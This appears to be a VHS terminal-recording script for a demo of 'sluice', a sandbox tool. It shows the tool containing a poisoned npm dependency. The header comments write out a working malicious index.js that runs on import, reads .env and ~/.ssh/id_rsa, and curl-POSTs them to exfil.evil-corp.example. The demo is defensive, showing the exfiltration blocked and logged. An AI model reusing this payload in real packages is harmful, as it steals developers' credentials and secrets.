# NPM supply-chain demo (README hero): a poisoned dependency's MODULE CODE runs the instant your app
# does require('evil-analytics') - it tries to steal .env + ~/.ssh and POST them to
# exfil.evil-corp.example - and the sandbox contains ALL of it while the install + import still succeed.
# (Import-time, not a postinstall: npm 12 blocks dependency install-scripts by default, but a dep's own
#  code still runs the moment you import it - the more universal, npm-version-proof vector.)
#   beat 1  cat the armed payload  - index.js runs on require: reads .env, ~/.ssh, POSTs the loot out.
#   beat 2  sluice run             - both targets unreadable in-box: .env masked to 0 bytes, no ~/.ssh.
#   beat 3  sluice                 - npm install is clean; then `require()` runs the payload at full
#                                    intent, exfil POST DROPPED, install + import still complete; then
#                                    the at-exit receipt (1 reached green = registry, 1 blocked red = exfil).
#   beat 4  sluice egress          - the box's durable per-host ledger, re-queryable from its own log.
#   beat 5  sluice egress --verify - the blocked-exfil record is tamper-evident (hash chain, green).
#
# Reproduce (from the repo root; .demos/ is gitignored recording scratch):
#   d=.demos/npm; rm -rf "$d"; mkdir -p "$d/vendor/evil-analytics" .demos/render
#   cp assets/demos/npm-supply-chain.config.sh "$d/sluice.config.sh"
#   printf 'export PATH="$PWD/bin:$PATH"\nexport SLUICE_NO_BANNER=1 SLUICE_NO_UPDATE_CHECK=1 DOCKER_CLI_HINTS=false\nexport PS1="$ "\ncd .demos/npm\n' > .demos/npm-setup.sh
#   cat > "$d/package.json" <<'JSON'
#   { "name": "npm-supply-chain-demo", "version": "1.0.0", "private": true,
#     "dependencies": { "is-number": "7.0.0", "evil-analytics": "file:./vendor/evil-analytics" } }
#   JSON
#   cat > "$d/vendor/evil-analytics/package.json" <<'JSON'
#   { "name": "evil-analytics", "version": "1.0.0", "main": "index.js" }
#   JSON
#   cat > "$d/vendor/evil-analytics/index.js" <<'JS'
#   // evil-analytics - malicious dependency. This runs the instant your app does require('evil-analytics').
#   require('child_process').execSync([
#     'echo "[evil-analytics] on import: harvesting host secrets..."',
#     'printf "  .env          -> %s bytes\\n" "$(cat .env 2>/dev/null | wc -c | tr -d " ")"',
#     'if cat "$HOME/.ssh/id_rsa" >/dev/null 2>&1; then printf "  ~/.ssh/id_rsa -> %s bytes\\n" "$(cat "$HOME/.ssh/id_rsa" | wc -c | tr -d " ")"; else echo "  ~/.ssh/id_rsa -> unreadable (not mounted)"; fi',
#     'echo "[evil-analytics] POSTing the loot to exfil.evil-corp.example ..."',
#     'curl -fsS -m8 -X POST -d "$(cat .env 2>/dev/null; cat "$HOME/.ssh/id_rsa" 2>/dev/null | base64)" https://exfil.evil-corp.example || echo "[evil-analytics] BLOCKED exfil.evil-corp.example unreachable (default-DROP egress)"',
#   ].join('\n'), { stdio: 'inherit', shell: '/bin/sh' });
#   JS
#   printf 'OPENAI_API_KEY=sk-live-51H8xEXAMPLEdonotcommit0000\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n' > "$d/.env"
#   ( cd "$d" && git init -q )                                                                 # own .git => no git-common-dir warning on camera
#   ( cd "$d" && PATH="$PWD/../../bin:$PATH" SLUICE_NO_BANNER=1 SLUICE_YES=1 sluice build )     # build off-camera
#   ( cd "$d" && PATH="$PWD/../../bin:$PATH" SLUICE_NO_BANNER=1 SLUICE_YES=1 sluice run npm cache clean --force ) # cold cache => registry shows as reached
#   vhs assets/demos/npm-supply-chain.tape                                                     # writes .demos/render/npm-supply-chain.gif
#   gifsicle -O3 --colors 128 .demos/render/npm-supply-chain.gif -o assets/npm-supply-chain.gif # optimize (visually lossless) into assets
# The Hide block below builds off camera, wipes the host-side egress log for a clean chain, then clears.

Output ".demos/render/npm-supply-chain.gif"
Set Shell "bash"
Set FontSize 18
Set Width 1200
Set Height 700
Set Padding 28
Set Theme "Dracula"
Set TypingSpeed 0ms

Hide
Type "source .demos/npm-setup.sh"
Enter
Sleep 1000ms
# start the audit log fresh so beat 5 reports a clean "1 record(s)" for the single on-camera egress run.
Type 'rm -f $HOME/.local/state/sluice/npm/egress-log.jsonl'
Enter
Sleep 800ms
Type "SLUICE_YES=1 sluice build >/dev/null 2>&1"
Enter
Sleep 8000ms
# cold the npm cache off-camera so beat 3's install genuinely fetches the registry (the "1 reached" row).
Type "SLUICE_YES=1 sluice run npm cache clean --force >/dev/null 2>&1"
Enter
Sleep 4000ms
Type "clear"
Enter
Sleep 500ms
Show

# beat 1: the armed payload - evil-analytics's main module (index.js) runs on require: it reads the
# project .env, reads ~/.ssh/id_rsa, and POSTs the concatenated loot out. A genuine payload, not a strawman.
Sleep 500ms
Type "cat vendor/evil-analytics/package.json vendor/evil-analytics/index.js"
Sleep 600ms
Enter
Sleep 4500ms

# clear between beats (off camera) so each beat starts on a fresh screen - no scroll accumulation
# (a full-screen scroll repaints every pixel, which bloats the gif).
Hide
Type "clear"
Enter
Sleep 200ms
Show

# beat 2: in the box both targets are unreadable - .env is masked to a 0-byte read (SLUICE_MASK=".env*"),
# and ~/.ssh was never mounted (only the project dir is). The seeded host secret never enters the box.
Type "sluice run sh -c 'echo == .env ==; cat .env; echo; echo == ~/.ssh ==; ls -la ~/.ssh 2>&1'"
Sleep 700ms
Enter
Sleep 4500ms

Hide
Type "clear"
Enter
Sleep 200ms
Show

# beat 3: npm install is clean (npm 12 runs no dep scripts); then the app does require('evil-analytics')
# and the dep's module code runs at full intent - reads an empty .env, no ~/.ssh, exfil POST DROPPED -
# yet install + import complete. Then the at-exit receipt: 1 reached (registry green), 1 blocked (exfil red).
Type "sluice"
Sleep 600ms
Enter
Sleep 9000ms

Hide
Type "clear"
Enter
Sleep 200ms
Show

# beat 4: the box's durable per-host ledger - registry reached, exfil host blocked, re-queryable from
# the box's own audit log long after the run.
Type "sluice egress"
Sleep 600ms
Enter
Sleep 4000ms

Hide
Type "clear"
Enter
Sleep 200ms
Show

# beat 5: walk the append-only hash chain - the blocked-exfil record is tamper-evident. Green, exit 0.
Type "sluice egress --verify"
Sleep 600ms
Enter
Sleep 4000ms
